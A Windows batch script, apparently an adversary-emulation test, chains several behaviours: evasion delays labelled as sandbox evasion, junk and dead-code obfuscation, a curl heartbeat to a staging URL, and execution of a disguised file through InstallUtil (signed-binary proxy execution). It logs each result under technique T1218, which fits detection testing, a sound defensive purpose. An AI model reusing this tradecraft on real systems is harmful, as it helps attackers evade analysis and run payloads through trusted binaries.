@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\7803\5a7669c2
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7803-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=visio.txt
SET dvhhyc=7803

REM Random variables for logic flow
SET kmdgvpj=%TEMP_DIR%
SET brwby=0
SET oefjs=1
SET mwcya=17
SET krbjnx=42
SET mstqg=99
SET rdyka=0
SET oopllp=1
SET tsrmbl=0

REM Debug logging file path
SET dbhvs=%APPDATA%\%rrocubc%\macula-simulations.log

REM Initial delay (40 seconds) to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: initial_delay_start>>> "%dbhvs%" 2>nul
ping -n 40 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: initial_delay_complete>>> "%dbhvs%" 2>nul

SET brwby=0
GOTO qwzxc

:lkjhgf
REM Dead code - never executed
SET fakevar=deadcode1
IF 2==3 GOTO asdfgh
GOTO END

:qwzxc
IF !brwby!==0 GOTO mnbvf
IF !brwby!==17 GOTO plkmj
IF !brwby!==42 GOTO tyuio
IF !brwby!==99 GOTO vbnmc

:asdfgh
REM More dead code
SET junkvar=noreach
GOTO END

:mnbvf
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: state_machine_init>>> "%dbhvs%" 2>nul
SET brwby=17

REM Random delay 5-25 seconds
SET /A rdyka=%RANDOM% %% 20 + 5
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: random_delay_start=!rdyka!s>>> "%dbhvs%" 2>nul
timeout /t !rdyka! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: random_delay_complete>>> "%dbhvs%" 2>nul

GOTO qwzxc

:zxcvbn
REM Dead code branch
IF 1==1 GOTO nevercalled
:nevercalled
SET deadvar=unused
GOTO END

:plkmj
REM Heartbeat check with curl
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_start>>> "%dbhvs%" 2>nul
curl -k -s -o nul !keghkgto!
IF !ERRORLEVEL! EQU 0 (
    SET tsrmbl=1
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_success>>> "%dbhvs%" 2>nul
) ELSE (
    SET tsrmbl=0
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_failed>>> "%dbhvs%" 2>nul
)

SET brwby=42

REM 12 second delay with CHOICE
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: choice_delay_start>>> "%dbhvs%" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: choice_delay_complete>>> "%dbhvs%" 2>nul

GOTO qwzxc

:poiuyt
REM Unreachable code block
SET fakeflag=0
IF !fakeflag!==0 GOTO deadend
:deadend
EXIT /B 1

:tyuio
REM Change to output directory
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_start=%txisnba%>>> "%dbhvs%" 2>nul
cd /d "%txisnba%" 2>nul
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_failed>>> "%dbhvs%" 2>nul
    SET brwby=99
    GOTO qwzxc
)
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_complete>>> "%dbhvs%" 2>nul

REM 8 second delay
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: ping_delay_start>>> "%dbhvs%" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: ping_delay_complete>>> "%dbhvs%" 2>nul

SET brwby=99
GOTO qwzxc

:rewqmn
REM Dead code with fake operations
SET fakedl=download.exe
GOTO END

:vbnmc
REM Execute InstallUtil with DLL
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: installutil_exec_start=%xzanpex%>>> "%dbhvs%" 2>nul

SET ttp_result=0
SET err_detail=

REM Execute InstallUtil
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U "%xzanpex%" >nul 2>&1

IF !ERRORLEVEL! EQU 0 (
    SET ttp_result=1
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: installutil_exec_success>>> "%dbhvs%" 2>nul
) ELSE (
    SET ttp_result=0
    SET err_detail=assembly_load_failed
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: installutil_exec_failed>>> "%dbhvs%" 2>nul
)

REM TTP logging
SET ttp_date=!DATE:/=-!
SET ttp_time=!TIME: =0!
IF "!ttp_time:~9,1!"=="," SET ttp_time=!ttp_time:,=.!
IF "!ttp_time:~9,1!"=="." SET ttp_time=!ttp_time:~0,9!000

(
    echo [!ttp_date! !ttp_time!][%jwcnifl%]: %rrocubc%-%dvhhyc%-T1218|SignedBinaryProxyExecution=!ttp_result!:"!err_detail!"
) >> "%APPDATA%\%rrocubc%\macula-simulations.log" 2>nul || (
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: ttp_logging_failed>>> "%dbhvs%" 2>nul
)

echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: installutil_exec_complete>>> "%dbhvs%" 2>nul

REM Final 15 second delay
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: final_delay_start>>> "%dbhvs%" 2>nul
timeout /t 15 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: final_delay_complete>>> "%dbhvs%" 2>nul

:END
ENDLOCAL